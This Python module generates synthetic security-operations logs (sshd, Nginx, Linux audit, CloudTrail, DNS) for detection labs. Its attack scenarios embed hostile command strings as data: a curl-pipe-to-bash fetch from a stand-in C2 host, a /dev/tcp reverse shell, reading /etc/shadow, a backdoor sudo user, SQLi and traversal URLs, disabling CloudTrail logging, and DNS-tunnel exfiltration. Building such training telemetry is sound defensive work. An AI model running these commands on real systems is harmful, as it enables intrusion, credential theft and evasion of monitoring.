"""Atomic-style controlled attack simulator generating synthetic multi-domain SOC telemetry.

Safety: This module ONLY writes synthetic log lines to disk. It never performs real
network scans, exploitation, or host modifications. All public IPs belong to RFC 5737
test ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and domains use RFC 2606 `.example`.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

SCENARIOS = (
    "ssh_compromise",
    "web_attacks",
    "linux_post_exploit",
    "cloud_iam_abuse",
    "dns_c2_exfil",
)


def _fmt_syslog_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def _fmt_web_ts(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def build_ssh_logs(base_time: datetime, *, include_attack: bool, include_benign: bool) -> list[str]:
    """Generate synthetic sshd syslog telemetry (benign admin logins + brute force -> compromise)."""
    lines: list[str] = []

    if include_benign:
        benign_events = [
            (0, "Accepted publickey for alice from 10.0.1.15 port 50120 ssh2"),
            (18, "Failed password for bob from 10.0.1.22 port 50411 ssh2"),
            (25, "Accepted password for bob from 10.0.1.22 port 50412 ssh2"),
            (40, "Accepted publickey for ci-runner from 10.0.2.50 port 51001 ssh2"),
        ]
        for offset, msg in benign_events:
            ts = _fmt_syslog_ts(base_time + timedelta(seconds=offset))
            lines.append(f"{ts} web-prod-01 sshd[4100]: {msg}")

    if include_attack:
        attacker_ip = "198.51.100.77"  # RFC 5737 test IP present in local TI feed
        attempted_users = ["root", "admin", "ubuntu", "postgres", "deploy", "deploy", "deploy"]
        for idx, user in enumerate(attempted_users):
            ts = _fmt_syslog_ts(base_time + timedelta(seconds=60 + idx * 8))
            inv = "invalid user " if user in {"admin", "ubuntu", "postgres"} else ""
            lines.append(
                f"{ts} web-prod-01 sshd[{4200 + idx}]: "
                f"Failed password for {inv}{user} from {attacker_ip} port {52100 + idx} ssh2"
            )
        # Successful compromise 15 seconds after the brute-force burst
        compromise_ts = _fmt_syslog_ts(base_time + timedelta(seconds=135))
        lines.append(
            f"{compromise_ts} web-prod-01 sshd[4299]: "
            f"Accepted password for deploy from {attacker_ip} port 52199 ssh2"
        )

    return lines


def build_web_logs(base_time: datetime, *, include_attack: bool, include_benign: bool) -> list[str]:
    """Generate synthetic Nginx combined access logs (normal traffic + SQLi, traversal, recon)."""
    lines: list[str] = []

    if include_benign:
        benign_requests = [
            (5, "10.0.5.12", "GET", "/", 200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
            (12, "10.0.5.12", "GET", "/api/v1/products?category=books", 200, "Mozilla/5.0"),
            (22, "10.0.5.19", "POST", "/api/v1/auth/login", 200, "Mozilla/5.0"),
            (30, "10.0.0.2", "GET", "/health?check=union+select", 200, "kube-probe/1.30"),
            (45, "10.0.5.25", "GET", "/static/app.js", 200, "Mozilla/5.0"),
        ]
        for offset, ip, method, url, status, ua in benign_requests:
            ts = _fmt_web_ts(base_time + timedelta(seconds=offset))
            lines.append(f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} 1024 "-" "{ua}"')

    if include_attack:
        scanner_ip = "203.0.113.45"  # RFC 5737 test IP present in local TI feed
        attack_requests = [
            # Sensitive file discovery (T1595.003)
            (70, "GET", "/.env", 404, "python-requests/2.32.0"),
            (74, "GET", "/.git/config", 404, "python-requests/2.32.0"),
            (78, "GET", "/backup.sql", 404, "python-requests/2.32.0"),
            (82, "GET", "/wp-login.php", 404, "python-requests/2.32.0"),
            # SQL Injection probes (T1190)
            (95, "GET", "/api/v1/users?id=1%27%20OR%20%271%27=%271", 400, "sqlmap/1.8"),
            (
                102,
                "GET",
                "/api/v1/orders?id=1+UNION+SELECT+username,password+FROM+users--",
                500,
                "sqlmap/1.8",
            ),
            # Path Traversal (T1190)
            (115, "GET", "/download?file=../../../../etc/passwd", 403, "curl/8.7.1"),
        ]
        for offset, method, url, status, ua in attack_requests:
            ts = _fmt_web_ts(base_time + timedelta(seconds=offset))
            lines.append(f'{scanner_ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} 312 "-" "{ua}"')

    return lines


def build_linux_audit_logs(
    base_time: datetime, *, include_attack: bool, include_benign: bool
) -> list[str]:
    """Generate synthetic Linux process execution audit logs in JSONL format."""
    records: list[dict[str, object]] = []

    if include_benign:
        benign_procs = [
            (10, "alice", "10.0.1.15", "ls", "ls -la /var/www/html", 3101),
            (
                20,
                "backup_agent",
                "10.0.2.10",
                "tar",
                "tar -czf /var/backups/etc.tgz /etc/shadow",
                3102,
            ),
            (
                35,
                "ansible_provisioner",
                "10.0.2.20",
                "useradd",
                "useradd -m -s /bin/bash dev_intern",
                3103,
            ),
            (50, "ci-runner", "10.0.2.50", "systemctl", "systemctl status nginx", 3104),
        ]
        for offset, user, src_ip, proc, cmd, pid in benign_procs:
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=offset)).isoformat(),
                    "host": "web-prod-01",
                    "user": user,
                    "source_ip": src_ip,
                    "process": proc,
                    "command_line": cmd,
                    "pid": pid,
                }
            )

    if include_attack:
        # Post-exploitation chain following compromised 'deploy' account from 198.51.100.77
        attack_procs = [
            (
                150,
                "deploy",
                "198.51.100.77",
                "bash",
                "bash -c 'curl -fsSL http://c2.malicious-lab.example/stage.sh | bash'",
                4810,
            ),
            (
                165,
                "deploy",
                "198.51.100.77",
                "bash",
                "bash -i >& /dev/tcp/192.0.2.99/4444 0>&1",
                4815,
            ),
            (
                185,
                "deploy",
                "198.51.100.77",
                "cat",
                "cat /etc/shadow",
                4822,
            ),
            (
                205,
                "root",
                "198.51.100.77",
                "useradd",
                "useradd -m -s /bin/bash svc_backup_tmp && usermod -aG sudo svc_backup_tmp",
                4830,
            ),
        ]
        for offset, user, src_ip, proc, cmd, pid in attack_procs:
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=offset)).isoformat(),
                    "host": "web-prod-01",
                    "user": user,
                    "source_ip": src_ip,
                    "process": proc,
                    "command_line": cmd,
                    "pid": pid,
                }
            )

    return [json.dumps(rec) for rec in records]


def build_cloudtrail_logs(
    base_time: datetime, *, include_attack: bool, include_benign: bool
) -> list[str]:
    """Generate synthetic AWS CloudTrail JSONL telemetry (benign IaC + IAM privesc / trail stop)."""
    records: list[dict[str, object]] = []

    if include_benign:
        records.extend(
            [
                {
                    "eventTime": (base_time + timedelta(seconds=15)).isoformat(),
                    "eventSource": "ec2.amazonaws.com",
                    "eventName": "DescribeInstances",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": "10.0.2.50",
                    "userAgent": "aws-cli/2.17.0",
                    "userIdentity": {"type": "IAMUser", "userName": "alice"},
                    "requestParameters": {},
                },
                {
                    "eventTime": (base_time + timedelta(seconds=28)).isoformat(),
                    "eventSource": "iam.amazonaws.com",
                    "eventName": "AttachUserPolicy",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": "10.0.2.60",
                    "userAgent": "Terraform/1.9.0",
                    "userIdentity": {"type": "IAMUser", "userName": "terraform-ci"},
                    "requestParameters": {
                        "userName": "app-deployer",
                        "policyArn": "arn:aws:iam::aws:policy/PowerUserAccess",
                    },
                },
                {
                    "eventTime": (base_time + timedelta(seconds=42)).isoformat(),
                    "eventSource": "cloudtrail.amazonaws.com",
                    "eventName": "UpdateTrail",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": "10.0.2.90",
                    "userAgent": "aws-cli/2.17.0",
                    "userIdentity": {"type": "IAMUser", "userName": "secops-breakglass"},
                    "requestParameters": {
                        "name": "legacy-test-trail",
                        "isMultiRegionTrail": False,
                    },
                },
            ]
        )

    if include_attack:
        cloud_attacker = "192.0.2.55"  # RFC 5737 test IP in local TI feed
        records.extend(
            [
                {
                    "eventTime": (base_time + timedelta(seconds=240)).isoformat(),
                    "eventSource": "iam.amazonaws.com",
                    "eventName": "AttachUserPolicy",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": cloud_attacker,
                    "userAgent": "Boto3/1.35.0 Python/3.12",
                    "userIdentity": {"type": "IAMUser", "userName": "compromised-dev"},
                    "requestParameters": {
                        "userName": "compromised-dev",
                        "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
                    },
                },
                {
                    "eventTime": (base_time + timedelta(seconds=255)).isoformat(),
                    "eventSource": "iam.amazonaws.com",
                    "eventName": "CreateAccessKey",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": cloud_attacker,
                    "userAgent": "Boto3/1.35.0 Python/3.12",
                    "userIdentity": {"type": "IAMUser", "userName": "compromised-dev"},
                    "requestParameters": {"userName": "svc_backup_tmp"},
                },
                {
                    "eventTime": (base_time + timedelta(seconds=275)).isoformat(),
                    "eventSource": "cloudtrail.amazonaws.com",
                    "eventName": "StopLogging",
                    "awsRegion": "us-east-1",
                    "sourceIPAddress": cloud_attacker,
                    "userAgent": "Boto3/1.35.0 Python/3.12",
                    "userIdentity": {"type": "IAMUser", "userName": "compromised-dev"},
                    "requestParameters": {"name": "prod-org-trail"},
                },
            ]
        )

    return [json.dumps(rec) for rec in records]


def build_dns_logs(
    base_time: datetime, *, include_attack: bool, include_benign: bool
) -> list[str]:
    """Generate synthetic DNS query JSONL telemetry (normal traffic + DNS tunneling exfil burst)."""
    records: list[dict[str, object]] = []

    if include_benign:
        benign_queries = [
            (8, "10.0.1.15", "api.github.com", "A"),
            (19, "10.0.1.22", "s3.us-east-1.amazonaws.com", "A"),
            (
                32,
                "10.0.2.30",
                "selector20261120longkeyhashabcdef._domainkey.corp.example",
                "TXT",
            ),
            (48, "10.0.5.12", "status.python.org", "AAAA"),
        ]
        for offset, src_ip, qname, qtype in benign_queries:
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=offset)).isoformat(),
                    "host": "dns-resolver-01",
                    "source_ip": src_ip,
                    "query": qname,
                    "qtype": qtype,
                    "rcode": "NOERROR",
                }
            )

    if include_attack:
        # Links back to attacker campaign 198.51.100.77 for cross-source kill-chain correlation
        chunks = [
            "4a9f8c2d7e6b1a0f3c5d8e9a7b2c4d6e",
            "9f1e2d3c4b5a69788796a5b4c3d2e1f0",
            "7c8d9e0f1a2b3c4d5e6f708192a3b4c5",
            "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e",
            "e1f2a3b4c5d6e7f8091a2b3c4d5e6f7a",
        ]
        for idx, chunk in enumerate(chunks):
            records.append(
                {
                    "timestamp": (base_time + timedelta(seconds=220 + idx * 6)).isoformat(),
                    "host": "dns-resolver-01",
                    "source_ip": "198.51.100.77",
                    "query": f"{chunk}.exfil.tunnel-lab.example",
                    "qtype": "TXT",
                    "rcode": "NOERROR",
                }
            )

    return [json.dumps(rec) for rec in records]


def generate_lab_logs(
    output_dir: str | Path,
    *,
    scenario: str = "all",
    include_benign: bool = True,
    base_time: datetime | None = None,
) -> dict[str, Path]:
    """Write synthetic SSH, Web, Linux Audit, AWS CloudTrail, and DNS logs into `output_dir`."""
    if scenario != "all" and scenario not in SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario!r}. Choose 'all' or one of {SCENARIOS}.")

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    start = base_time or datetime(2026, 11, 20, 14, 10, 0, tzinfo=UTC)

    ssh_lines = build_ssh_logs(
        start,
        include_attack=scenario in {"all", "ssh_compromise"},
        include_benign=include_benign,
    )
    web_lines = build_web_logs(
        start,
        include_attack=scenario in {"all", "web_attacks"},
        include_benign=include_benign,
    )
    audit_lines = build_linux_audit_logs(
        start,
        include_attack=scenario in {"all", "linux_post_exploit"},
        include_benign=include_benign,
    )
    cloudtrail_lines = build_cloudtrail_logs(
        start,
        include_attack=scenario in {"all", "cloud_iam_abuse"},
        include_benign=include_benign,
    )
    dns_lines = build_dns_logs(
        start,
        include_attack=scenario in {"all", "dns_c2_exfil"},
        include_benign=include_benign,
    )

    outputs = {
        "sshd": (out / "auth.log", ssh_lines),
        "webserver": (out / "access.log", web_lines),
        "linux_audit": (out / "linux_audit.jsonl", audit_lines),
        "aws_cloudtrail": (out / "cloudtrail.jsonl", cloudtrail_lines),
        "dns": (out / "dns_queries.jsonl", dns_lines),
    }

    written: dict[str, Path] = {}
    for key, (path, lines) in outputs.items():
        path.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
        written[key] = path

    return written
